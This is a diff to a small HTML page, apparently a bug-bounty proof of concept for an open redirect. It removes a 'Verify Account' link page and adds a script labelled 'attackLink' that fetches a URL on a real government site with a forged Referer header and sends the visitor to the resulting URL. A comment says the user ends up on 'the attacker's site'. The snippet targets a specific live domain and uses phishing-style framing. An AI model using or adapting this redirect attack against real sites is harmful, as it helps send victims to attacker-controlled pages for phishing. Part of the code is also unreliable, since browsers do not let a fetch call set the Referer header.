@@ -1,12 +1,14 @@
-<!DOCTYPE html>
-<html>
-  <head>
-    <title>Redirect Test</title>
-  </head>
-  <body>
-    <h2>Click the link below to continue</h2>
-    <a href="https://aq.riyadhenv.gov.sa/switch_lang/ar" target="_blank">
-      Verify Account
-    </a>
-  </body>
-</html>
+<a href="https://aq.riyadhenv.gov.sa/switch_lang/ar" id="attackLink">Click Me</a>
+<script>
+  document.getElementById("attackLink").addEventListener("click", () => {
+    fetch("https://aq.riyadhenv.gov.sa/switch_lang/ar", {
+      method: "GET",
+      headers: {
+        "Referer": "https://0xnzs.github.io/BB/BB.html"
+      }
+    }).then(response => {
+      // The user is redirected to the attacker's site
+      window.location = response.url;
+    });
+  });
+</script>
